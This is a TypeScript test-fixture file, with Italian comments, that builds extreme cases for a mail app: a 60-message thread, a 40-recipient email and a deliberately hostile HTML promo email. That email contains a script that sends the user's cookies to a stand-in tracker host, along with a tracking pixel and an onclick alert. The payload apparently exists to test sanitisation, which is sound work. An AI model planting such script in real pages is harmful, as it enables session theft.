import type { MailAddress, MailMessage } from "../../types";
import { TODAY } from "../dates";
import { at, done, ext, mail, person } from "./helpers";

// I contenuti estremi della Posta: una conversazione da 60 messaggi, un HTML
// ostile (script e immagini remote) e un'email con 40 destinatari.

export const EXTREME_MESSAGE_IDS = {
  longThread: "mm-stw-onboarding-copy-1",
  hostileHtml: "mm-promo-fiera",
  fortyRecipients: "mm-mdw-speakers",
} as const;

const GIULIA = person("p-giulia");
const LAURA = person("p-laura");

/** 60 messaggi fra Giulia e Laura sui testi dell'onboarding, uno ogni 3 ore. */
function longThread(): MailMessage[] {
  const start = Date.parse(`${TODAY}T08:00:00Z`) - 10 * 86_400_000;
  return Array.from({ length: 60 }, (_, i) => {
    const fromGiulia = i % 2 === 0;
    const n = i + 1;
    return mail({
      id: `mm-stw-onboarding-copy-${n}`,
      threadId: "th-stw-onboarding-copy",
      from: fromGiulia ? GIULIA : LAURA,
      to: [fromGiulia ? LAURA : GIULIA],
      subject:
        n === 1
          ? "Onboarding copy for the desktop preview"
          : "Re: Onboarding copy for the desktop preview",
      at: new Date(start + i * 3 * 3_600_000).toISOString().replace(/\.\d{3}Z$/, "Z"),
      text: fromGiulia
        ? `Version ${Math.ceil(n / 2)} of the welcome screen copy: shorter headline, one sentence per step.`
        : `Thanks. Version ${Math.ceil(n / 2)} reads better; the third step still says “workspace”, can we say “project”?`,
      quoted: n === 1 ? null : "> Previous message in the thread",
      // Solo la casella di Giulia: quella di Laura è ferma da prima.
      mailboxPersonIds: ["p-giulia"],
      readByPersonIds: n < 60 ? ["p-giulia"] : [],
      classification: done(["prj-stw"], "low"),
    });
  });
}

const HOSTILE_HTML = [
  "<html><body>",
  "<script>document.location='https://tracker.example/steal?c='+document.cookie</script>",
  '<img src="https://tracker.example/pixel.gif?u=giulia" width="1" height="1">',
  '<h1 onclick="alert(1)">Offerte riservate Fiera Digitale</h1>',
  '<img src="https://cdn.fieradigitale.example/banner.jpg" alt="Banner">',
  '<p>Solo per oggi: stand a metà prezzo. <a href="https://fieradigitale.example/offerta">Scopri</a></p>',
  "</body></html>",
].join("\n");

/** 29 + 9 indirizzi esterni: con Matteo e Giulia fanno 40 destinatari. */
const crowd = (prefix: string, count: number): MailAddress[] =>
  Array.from({ length: count }, (_, i) =>
    ext(`Speaker ${prefix}${i + 1}`, `speaker.${prefix}${i + 1}@mdw.example`),
  );

export const EXTREME_MESSAGES: MailMessage[] = [
  ...longThread(),
  mail({
    id: EXTREME_MESSAGE_IDS.hostileHtml,
    threadId: "th-promo-fiera",
    from: ext("Fiera Digitale", "promo@fieradigitale.example"),
    to: [GIULIA],
    subject: "Offerte riservate Fiera Digitale",
    at: at(0, "06:45"),
    text: "Offerte riservate Fiera Digitale. Solo per oggi: stand a metà prezzo.",
    html: HOSTILE_HTML,
    mailboxPersonIds: ["p-giulia"],
    classification: done([], "low"),
  }),
  mail({
    id: EXTREME_MESSAGE_IDS.fortyRecipients,
    threadId: "th-mdw-speakers",
    from: ext("Milano Digital Week", "info@mdw.example"),
    to: [person("p-matteo"), ...crowd("a", 29)],
    cc: [GIULIA, ...crowd("c", 9)],
    subject: "Milano Digital Week: speakers' briefing and schedule",
    at: at(2, "13:00"),
    text: "Dear speakers, attached you'll find the schedule of the talks and the briefing for the day.",
    attachments: [{ id: "att-mdw-schedule", name: "mdw-schedule.pdf", sizeBytes: 1_204_224 }],
    mailboxPersonIds: ["p-matteo", "p-giulia"],
    classification: done([], "low"),
  }),
];
